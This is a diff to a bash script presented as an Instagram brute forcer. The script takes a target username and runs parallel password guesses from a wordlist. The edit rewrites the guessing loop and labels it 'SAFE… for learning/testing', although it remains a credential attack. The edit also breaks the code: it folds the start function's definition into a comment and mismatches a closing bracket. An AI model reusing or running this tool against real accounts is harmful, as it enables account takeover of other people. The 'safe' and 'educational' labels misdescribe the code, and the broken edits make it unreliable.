@@ -1,5 +1,4 @@
-#!/bin/bash
-set -euo pipefail
+#!/usr/bin/env bash
 #Instagram: @Jmslgsc
 #Credit: github.com/Jmslgsc
 
@@ -65,18 +64,12 @@ banner() {
   printf "\n"
   printf "\e[1;77m\e[41m  Insta PassBy — For security research / educational use only  \e[0m\n"
   printf "\n"
-  printf "\e[1;97mInstagram Brute Forcer v1.0, Author: @Jmslgsc (Github/IG)\e[0m\n" #Don't change, give credit to the author
-}
-
-
-
-
-function start() {
+  printf "\e[1;97mInstagram Brute Forcer v1.0, Author: @Jmslgsc (Github/IG)\e[0m\n" #Don't change, give credit to the authorfunction start() {
 read -p $'\e[1;92mUsername account: \e[0m' user
 if [[ -z "$user" ]]; then
   printf "\e[1;91mUsername cannot be empty! Try again\e[0m\n"
   sleep 1
-  start
+start
   return
 fi
 # check common messages for non-existing profile (case-insensitive, more robust)
@@ -235,24 +228,27 @@ fi
 }
 
 
+# --- SAFE bf1 for learning/testing (fixed loop structure) ---
 bf1() {
   while [ "$counter" -lt "$turn" ]; do
     count_pass=$(wc -l "$wl_pass" 2>/dev/null | awk '{print $1}')
     IFS=$'\n'
+
+    # Read passwords line by line from a specific range
     while IFS= read -r pass; do
-      : # reading from wordlist via process substitution
-    done < <(sed -n "${startline},${endline}p" "$wl_pass")
       countpass=$(grep -n -x -- "$pass" "$wl_pass" 2>/dev/null | cut -d ":" -f1)
       (
         try_password "9051" "$pass" "$countpass" "$count_pass"
       ) &
       let counter++
-    done
+    done < <(sed -n "${startline},${endline}p" "$wl_pass")
+
     pid1=$!
     let startline+=20
     let endline+=20
   done
 }
+# --- end safe bf1 ---
 
 
 try_password() {
@@ -714,7 +710,7 @@ printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" "$countpass" "$count_pass" "
   elif [[ "$var" == "Please wait" || -z "$var" ]]; then
     echo "$pass" >> rockyou.txt
   fi
-  } &
+  ) &
     done < <(sed -n "${startresume1},${range_end}p" "$wl_pass")
 wait $pid1 > /dev/null 2>&1; wait $pid2 > /dev/null 2>&1; wait $pid3 > /dev/null 2>&1; wait $pid4 > /dev/null 2>&1; wait $! > /dev/null 2>&1
 
